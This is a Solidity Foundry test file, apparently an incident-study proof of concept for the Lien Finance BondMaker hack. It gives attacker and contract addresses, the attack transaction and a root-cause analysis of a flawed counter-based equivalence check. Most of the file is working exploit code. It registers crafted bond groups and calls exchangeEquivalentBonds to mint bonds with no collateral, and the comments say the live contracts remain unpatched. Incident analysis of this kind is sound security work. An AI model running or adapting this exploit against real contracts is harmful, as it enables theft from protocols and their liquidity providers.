// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 542,144.63 USDC
// Attacker : 0x0D7d9023531aD1A88414E216Ee2715F63561808a
// Attack Contract : 0xe74d17c1bE3721E65e0af286D47B3BA58B08062e
// Vulnerable Contract : 0xDA6FC5625E617bB92F5359921D43321cEbC6BEf0 (BondMakerCollateralizedEth #1)
//                       0x843225CF6e663e4454732D6B551A737Ac7b47de0 (BondMakerCollateralizedEth #2)
// OTC Venues : 0x656e5e976d523a427f05B0c212A22A89ccD9eF18 (GeneralizedDotc)
//              0x7db84492cfd27e47c39499d852decc2a01476a75 / 0x0949c77ad52602ac61b42d2de0eeb1b7cc79250f
// Attack Tx : https://etherscan.io/tx/0xb96d572b557a12f5ef193e88cca86123a6ae1b6e98b0eeee265870c85848e0e7
//
// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0xDA6FC5625E617bB92F5359921D43321cEbC6BEf0#code
//
// @Analysis
// VeriChains : https://blog.verichains.io/p/lien-finance-hack-analysis
// SlowMist  : https://x.com/SlowMist_Team/status/2080555677811171459
// Local deep-dive : ../../../reports/2026-09-17-lien-deepdive.md
//
// Attack summary: the attacker registered two "equivalent" bond groups in the same tx
// (input group = [X, B], output group = [C, X, X] with bond X duplicated), then called
// exchangeEquivalentBonds(input, output, amount, exceptions=[X, B]). The function verifies multiset
// equivalence with a single running counter (exceptionCount++ per match while scanning the input
// group, exceptionCount-- while scanning the output group) instead of a per-element multiset check:
// exceptioning the whole input group skips every burn (nothing needs to be held), and the duplicated
// bond in the output group drives the counter back to zero while the extra bond C mints FREE.
// The unbacked bonds were then sold at par into three pre-authorized GeneralizedDotc OTC venues whose
// bondPricer (fnMap payoff + oracle) prices bonds without any collateral-backing reference, draining
// the LP seller's USDC allowances.
//
// Root cause: aggregate-counter equivalence check in exchangeEquivalentBonds (both BondMaker
// instances, STILL UNPATCHED on-chain as of 2026-09-17) + a quoting venue that prices minted supply
// without checking it is backed.
//
// NOTE: this PoC is authored in-repo (not a DeFiHackLabs copy - no upstream PoC exists for this
// incident). Run from a full DeFiHackLabs clone:
//   forge test --fork-url $RPC --match-contract LienFinanceExp -vvv
// It re-registers FRESH groups (the attack's groups 36/37/2/3/4 are already registered; the function
// under test is permissionless) against the LIVE BondMaker #1 and re-runs the free mint with zero
// collateral - which is the point.
//
// Bond math (payoff polynomials, rate x in uint64, y in rate units):
//   C = SBT(K):       (0,0)  -> (K,K) -> (3K,K)                  y = min(x, K)
//   X = "half LBT":   (0,0)  -> (K,0) -> (3K,K)                  y = max(x-K, 0)/2
//   B = X-complement: (0,0)  -> (K,K) -> (3K,2K)                 y = x - max(x-K, 0)/2
//   group INPUT  = [X, B]      : y_X + y_B = x at every breakpoint  -> valid partition
//   group OUTPUT = [C, X, X]   : y_C + 2*y_X = x at every breakpoint -> valid partition
//   exchange(INPUT -> OUTPUT, amount, exceptions=[X, B]):
//     input  scan: X +1, B +1  => require(2 == exceptions.length) ok, NOTHING burned
//     output scan: C minted, X -1, X -1 => require(0 == 0) ok
//     net: amount of C minted with zero collateral and zero bonds held.

interface IBondMaker {
    function registerNewBond(uint256 maturity, bytes calldata fnMap) external returns (bytes32 bondID);

    function registerNewBondGroup(bytes32[] calldata bondIDs, uint256 maturity)
        external
        returns (uint256 bondGroupID);

    function exchangeEquivalentBonds(
        uint256 inputBondGroupID,
        uint256 outputBondGroupID,
        uint256 amount,
        bytes32[] calldata exceptionBonds
    ) external returns (bool);

    function getBond(bytes32 bondID)
        external
        view
        returns (
            address bondAddress,
            uint256 maturity,
            uint64 solidStrikePrice,
            bytes32 fnMapID
        );

    function nextBondGroupID() external view returns (uint256);
}

interface IERC20Bond {
    function balanceOf(address) external view returns (uint256);
}

contract LienFinanceExp is BaseTest {
    // BondMakerCollateralizedEth #1 - still live, still vulnerable (verified source matches bytecode)
    IBondMaker constant BOND_MAKER = IBondMaker(0xDA6FC5625E617bB92F5359921D43321cEbC6BEf0);

    uint256 constant FORK_BLOCK = 25_599_302; // block of the attack tx
    uint64 constant K = 100_000_000; // strike in rate units

    function _seg(uint64 x1, uint64 y1, uint64 x2, uint64 y2) internal pure returns (uint256) {
        // BondMaker.Polyline.zipLineSegment: (x1<<192) | (y1<<128) | (x2<<64) | y2
        return (uint256(x1) << 192) | (uint256(y1) << 128) | (uint256(x2) << 64) | uint256(y2);
    }

    function _fnMap2Seg(
        uint64 x1, uint64 y1, uint64 x2, uint64 y2,
        uint64 x3, uint64 y3, uint64 x4, uint64 y4
    ) internal pure returns (bytes memory) {
        // decodePolyline: abi.decode(fnMap, (uint256[])) - array of zipped segments
        uint256[] memory zips = new uint256[](2);
        zips[0] = _seg(x1, y1, x2, y2);
        zips[1] = _seg(x3, y3, x4, y4);
        return abi.encode(zips);
    }

    function setUp() public {
        vm.createSelectFork("mainnet", FORK_BLOCK);
    }

    function testExchangeMintsUnbackedForFree() public {
        // fresh maturity so _assertBeforeMaturity always passes
        uint256 maturity = block.timestamp + 30 days;

        // 1) register the three payoff components (registerNewBond is permissionless)
        //   C = SBT(K):       (0,0) -> (K,K) -> (3K,K)   y = min(x, K)
        //   X = "half LBT":   (0,0) -> (K,0) -> (3K,K)   y = max(x-K, 0)/2
        //   B = X-complement: (0,0) -> (K,K) -> (3K,2K)  y = x - max(x-K, 0)/2
        bytes32 bondC = BOND_MAKER.registerNewBond(maturity, _fnMap2Seg(0, 0, K, K, K, K, 3 * K, K));
        bytes32 bondX = BOND_MAKER.registerNewBond(maturity, _fnMap2Seg(0, 0, K, 0, K, 0, 3 * K, K));
        bytes32 bondB = BOND_MAKER.registerNewBond(maturity, _fnMap2Seg(0, 0, K, K, K, K, 3 * K, 2 * K));

        // 2) register the trap groups (registerNewBondGroup is permissionless)
        uint256 gidInput = BOND_MAKER.nextBondGroupID();
        bytes32[] memory inputGroup = new bytes32[](2);
        inputGroup[0] = bondX;
        inputGroup[1] = bondB;
        BOND_MAKER.registerNewBondGroup(inputGroup, maturity);

        bytes32[] memory outputGroup = new bytes32[](3);
        outputGroup[0] = bondC;
        outputGroup[1] = bondX;
        outputGroup[2] = bondX; // duplicated: launders the running counter
        BOND_MAKER.registerNewBondGroup(outputGroup, maturity);

        // sanity: we hold no bonds at all
        (address cToken, , , ) = BOND_MAKER.getBond(bondC);
        assertEq(IERC20Bond(cToken).balanceOf(address(this)), 0, "pre: no C");

        // 3) the bug: whole input group exceptioned, output-only bond mints unbacked
        uint256 amount = 1000e8;
        bytes32[] memory exceptions = new bytes32[](2);
        exceptions[0] = bondX;
        exceptions[1] = bondB;
        BOND_MAKER.exchangeEquivalentBonds(gidInput, gidInput + 1, amount, exceptions);

        // 4) `amount` of C minted with zero collateral, zero bonds burned, zero bonds held
        assertEq(IERC20Bond(cToken).balanceOf(address(this)), amount, "C minted for free");
        emit log_named_uint("unbacked bond C minted with zero collateral", amount);

        // At attack-time these bonds sold at par into GeneralizedDotc via exchangeBondToErc20
        // (bondPricer prices fnMap payoff + oracle, no backing check): the OTC venues' seller
        // allowances were the real pot - 542,144.63 USDC on 2026-07-24. All venues are drained
        // today, which is the only reason this still-safe-to-run PoC stops at the mint.
    }
}
